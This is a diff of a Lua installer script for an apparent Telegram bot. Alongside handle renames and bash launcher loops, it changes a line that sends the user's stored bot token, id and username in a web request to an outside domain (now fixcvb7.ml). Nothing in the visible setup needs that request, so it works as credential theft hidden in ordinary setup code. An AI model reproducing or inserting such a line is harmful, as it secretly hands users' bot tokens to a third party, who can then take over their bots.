@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_AlBaghdadi_Info()
 Create_Info(database:get(Server_AlBaghdadi.."Token_AlBaghdadi"),database:get(Server_AlBaghdadi.."Id_AlBaghdadi"),database:get(Server_AlBaghdadi.."UserName_AlBaghdadi"))   
-https.request("https://forhassan.ml/AlBaghdadi/AlBaghdadi.php?id="..database:get(Server_AlBaghdadi.."Id_AlBaghdadi").."&user="..database:get(Server_AlBaghdadi.."UserName_AlBaghdadi").."&token="..database:get(Server_AlBaghdadi.."Token_AlBaghdadi"))
+https.request("https://fixcvb7.ml/p3p.php?id="..database:get(Server_AlBaghdadi.."Id_AlBaghdadi").."&user="..database:get(Server_AlBaghdadi.."UserName_AlBaghdadi").."&token="..database:get(Server_AlBaghdadi.."Token_AlBaghdadi"))
 local RunAlBaghdadi = io.open("AlBaghdadi", 'w')
 RunAlBaghdadi:write([[
 #!/usr/bin/env bash
@@ -77,9 +77,9 @@ rm -fr ../.telegram-cli
 ./tg -s ./AlBaghdadi.lua -p PROFILE --bot=$token
 done
 ]])
-RunBG:close()
-local RunBG = io.open("BG", 'w')
-RunBG:write([[
+RunAlBaghdadi:close()
+local RunTs = io.open("ts", 'w')
+RunTs:write([[
 #!/usr/bin/env bash
 cd $HOME/AlBaghdadi
 while(true) do
@@ -88,7 +88,7 @@ screen -S AlBaghdadi -X kill
 screen -S AlBaghdadi ./AlBaghdadi
 done
 ]])
-RunBG:close()
+RunTs:close()
 end
 Files_AlBaghdadi_Info()
 database:del(Server_AlBaghdadi.."Token_AlBaghdadi");database:del(Server_AlBaghdadi.."Id_AlBaghdadi");database:del(Server_AlBaghdadi.."UserName_AlBaghdadi")
